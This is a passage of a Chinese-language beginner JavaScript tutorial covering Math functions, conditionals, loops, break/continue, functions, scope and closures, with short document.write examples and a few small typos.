&lt;p&gt;cos()&lt;&#x2F;p&gt;
&lt;p&gt;tan()&lt;&#x2F;p&gt;
&lt;p&gt;floor()向下取整&lt;&#x2F;p&gt;
&lt;p&gt;ceil()向上取整&lt;&#x2F;p&gt;
&lt;p&gt;round()四舍五入&lt;&#x2F;p&gt;
&lt;p&gt;max()取最大值&lt;&#x2F;p&gt;
&lt;p&gt;min(x,y)&lt;&#x2F;p&gt;
&lt;p&gt;random() 返回0-1之间的随机数&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; var random=Math.random()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        function getRandom(n,m){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            var choice=m-n+1&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            return Math.floor(Math.random()*choice+n)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		}&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var a=getRandom(1,10)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;JavaScript条件语句&lt;&#x2F;p&gt;
&lt;p&gt;流程控制语句包括 if for while switch continue break&lt;&#x2F;p&gt;
&lt;p&gt;if&lt;&#x2F;p&gt;
&lt;p&gt;if else&lt;&#x2F;p&gt;
&lt;p&gt;if elseif else&lt;&#x2F;p&gt;
&lt;p&gt;switch 用来选择多个代码块之一来执行&lt;&#x2F;p&gt;
&lt;p&gt;语法：&lt;&#x2F;p&gt;
&lt;p&gt;if(条件){&lt;&#x2F;p&gt;
&lt;p&gt;代码块&lt;&#x2F;p&gt;
&lt;p&gt;}&lt;&#x2F;p&gt;
&lt;p&gt;elseif{&lt;&#x2F;p&gt;
&lt;p&gt;代码块&lt;&#x2F;p&gt;
&lt;p&gt;}&lt;&#x2F;p&gt;
&lt;p&gt;else{&lt;&#x2F;p&gt;
&lt;p&gt;代码块&lt;&#x2F;p&gt;
&lt;p&gt;}&lt;&#x2F;p&gt;
&lt;p&gt;switch(n){&lt;&#x2F;p&gt;
&lt;p&gt;case1:&lt;&#x2F;p&gt;
&lt;p&gt;​	代码块1;&lt;&#x2F;p&gt;
&lt;p&gt;​	break;&lt;&#x2F;p&gt;
&lt;p&gt;case2:&lt;&#x2F;p&gt;
&lt;p&gt;​	代码块2;&lt;&#x2F;p&gt;
&lt;p&gt;​	break;&lt;&#x2F;p&gt;
&lt;p&gt;default:&lt;&#x2F;p&gt;
&lt;p&gt;​	如果不满足上面的case，则执行default语句&lt;&#x2F;p&gt;
&lt;p&gt;}&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var a=0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if(a&amp;gt;0){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            document.write(a);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        else if(a&amp;lt;0){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            document.write(Math.abs(a));&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        else{&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            document.write(&amp;#39;haha&amp;#39;);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var a=new Date().getDay()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var x;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        switch(a){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            case 0:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                x=&amp;quot;星期天&amp;quot;;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                break;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            case 1:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                x=&amp;quot;星期一&amp;quot;;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                break;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            case 2:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                x=&amp;quot;星期二&amp;quot;;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                break;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            case 3:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                x=&amp;quot;星期三&amp;quot;;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                break;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            case 4:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                x=&amp;quot;星期四&amp;quot;;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                break;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            case 5:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                x=&amp;quot;星期五&amp;quot;;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                break;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            case 6:  &#x2F;&#x2F;也可以换成default&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                x=&amp;quot;星期六&amp;quot;;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(x);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;JavaScript循环语句&lt;&#x2F;p&gt;
&lt;p&gt;for循环代码块一定的次数&lt;&#x2F;p&gt;
&lt;p&gt;for&#x2F;in  循环的时候再做遍历&lt;&#x2F;p&gt;
&lt;p&gt;while&lt;&#x2F;p&gt;
&lt;p&gt;do&#x2F;while&lt;&#x2F;p&gt;
&lt;p&gt;for(语句1；语句2；语句3){&lt;&#x2F;p&gt;
&lt;p&gt;​	代码块&lt;&#x2F;p&gt;
&lt;p&gt;}&lt;&#x2F;p&gt;
&lt;p&gt;语句一和语句三是可选的，语句二必选&lt;&#x2F;p&gt;
&lt;p&gt;语句一是在循环之前执行&lt;&#x2F;p&gt;
&lt;p&gt;语句三是在循环一次之后执行，也可以写在循环代码块中&lt;&#x2F;p&gt;
&lt;p&gt;for(x in y){&lt;&#x2F;p&gt;
&lt;p&gt;代码块；&lt;&#x2F;p&gt;
&lt;p&gt;}&lt;&#x2F;p&gt;
&lt;p&gt;while(循环条件){&lt;&#x2F;p&gt;
&lt;p&gt;​	代码块&lt;&#x2F;p&gt;
&lt;p&gt;}&lt;&#x2F;p&gt;
&lt;p&gt;do{&lt;&#x2F;p&gt;
&lt;p&gt;​	必须先执行的代码块&lt;&#x2F;p&gt;
&lt;p&gt;}&lt;&#x2F;p&gt;
&lt;p&gt;while{&lt;&#x2F;p&gt;
&lt;p&gt;代码块&lt;&#x2F;p&gt;
&lt;p&gt;}&lt;&#x2F;p&gt;
&lt;p&gt;for循环和while循环的区别&lt;&#x2F;p&gt;
&lt;p&gt;for循环一般情况下，适合运行已知循环次数的代码&lt;&#x2F;p&gt;
&lt;p&gt;while循环适合运行未知循环次数的代码&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var a=0;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var i;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        for(i=1;i&amp;lt;=100;i++){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            a=a+i;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var a=[&amp;#39;abc&amp;#39;,&amp;#39;def&amp;#39;,&amp;#39;xyz&amp;#39;];&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var i;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var b;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        for(i=0;i&amp;lt;a.length;i++){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            b=a[i]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            document.write(b+&amp;#39;&amp;lt;br&amp;gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var a=0;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var i=0;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        while(i&amp;lt;10){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            a=a+i;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            i++;    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(a+&amp;#39;&amp;lt;br&amp;gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var a=&amp;#39;hello&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var i=0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var b=[]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        while(i&amp;lt;a.length)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        {&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            b.push(a[i])&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            i++&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(b+&amp;#39;&amp;lt;br&amp;gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var a=&amp;#39;&amp;#39;;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var i=0;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        do{&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            a=a+&amp;#39;the number is&amp;#39;+i+&amp;#39;&amp;lt;br&amp;gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            i++&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        while(i&amp;lt;10);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        for(i=1;i&amp;lt;=9;i++){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            for(j=1;j&amp;lt;=i;j++){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                document.write(j+&amp;#39;*&amp;#39;+i+&amp;#39;=&amp;#39;+j*i+&amp;#39;&amp;amp;nbsp;&amp;amp;nbsp&amp;#39;);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            document.write(&amp;#39;&amp;lt;br&amp;gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;while循环先做判断再执行&lt;&#x2F;p&gt;
&lt;p&gt;do while 先执行再判断&lt;&#x2F;p&gt;
&lt;p&gt;JavaScript终止语句&lt;&#x2F;p&gt;
&lt;p&gt;braek &lt;&#x2F;p&gt;
&lt;p&gt;continue&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var a=&amp;#39;&amp;#39;;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var i=0;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        for(i=0;i&amp;lt;10;i++){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            if (i==5){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                continue;&#x2F;&#x2F;也可以换成break，但是效果不同&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            a=a+&amp;quot;the number is&amp;quot;+i+&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;JavaScript函数&lt;&#x2F;p&gt;
&lt;p&gt;函数指的就是封装好的，可以直接调用的，可以重复使用的代码块。&lt;&#x2F;p&gt;
&lt;p&gt;函数一般由变量、数据类型、表达式、流程控制等语句组成。&lt;&#x2F;p&gt;
&lt;p&gt;语法&lt;&#x2F;p&gt;
&lt;p&gt;基础函数&lt;&#x2F;p&gt;
&lt;p&gt;function functionname(){&lt;&#x2F;p&gt;
&lt;p&gt;​	函数的代码块;&lt;&#x2F;p&gt;
&lt;p&gt;}&lt;&#x2F;p&gt;
&lt;p&gt;带参数函数&lt;&#x2F;p&gt;
&lt;p&gt;function functionname(var1,var2){&lt;&#x2F;p&gt;
&lt;p&gt;函数的代码块&lt;&#x2F;p&gt;
&lt;p&gt;}&lt;&#x2F;p&gt;
&lt;p&gt;带返回值函数&lt;&#x2F;p&gt;
&lt;p&gt;function functionname(){&lt;&#x2F;p&gt;
&lt;p&gt;函数的代码块&lt;&#x2F;p&gt;
&lt;p&gt;return x&lt;&#x2F;p&gt;
&lt;p&gt;}&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        function abs(x){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            if(x&amp;gt;=0){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                return x;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            else{&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                return -x;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var a=abs(-10)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        function myfunction(name,job){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            document.write(&amp;#39;welcome&amp;#39;+name+&amp;#39;,the&amp;#39;+job+&amp;#39;&amp;lt;br&amp;gt;&amp;#39;);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        myfunction(&amp;#39;xiaoming&amp;#39;,&amp;#39;xuesheng&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var myobject={&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            firstname:&amp;#39;li&amp;#39;,&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            lastname:&amp;#39;xiaoming&amp;#39;,&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            fullname:function(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                return this.firstname+&amp;quot; &amp;quot;+this.lastname;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(myobject.fullname())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;函数的变量和作用域&lt;&#x2F;p&gt;
&lt;p&gt;处于函数内部的变量称为局部变量；处于函数外部的变量称为全局变量。局部变量和全局变量的调用范围是不同的，局部变量只能用于函数内部，全局变量能作用于全局&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        function foo(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            var x,y;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            x=1;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            y=x+2;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            return y;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(foo())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        function boo(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            var x,y;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            x=10;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            y=x+20;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            return y;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(boo())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var a=10;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        function sum(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            var b=a+1;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            return b;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(sum())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(x)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;函数的闭包&lt;&#x2F;p&gt;
&lt;p&gt;函数可以调用外部函数或者全局的变量，闭包可以实现更复杂的计算&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var iBaseNum=10;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        function addNum(iNum1,iNum2){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            function doAdd(){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                return iNum1+iNum2+iBaseNum;&#x2F;&#x2F;内层函数调用外层函数的参数，这也属于闭包&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            return doAdd()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(addNum(1,2))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;arguments作用&lt;&#x2F;p&gt;
&lt;p&gt;计算任意两个数的平均值&lt;&#x2F;p&gt;
&lt;p&gt;arguments可以获取函数参数的内容和长度&lt;&#x2F;p&gt;
&lt;p&gt;获取长度 arguments.length&lt;&#x2F;p&gt;
&lt;p&gt;获取内容 arguments[]&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
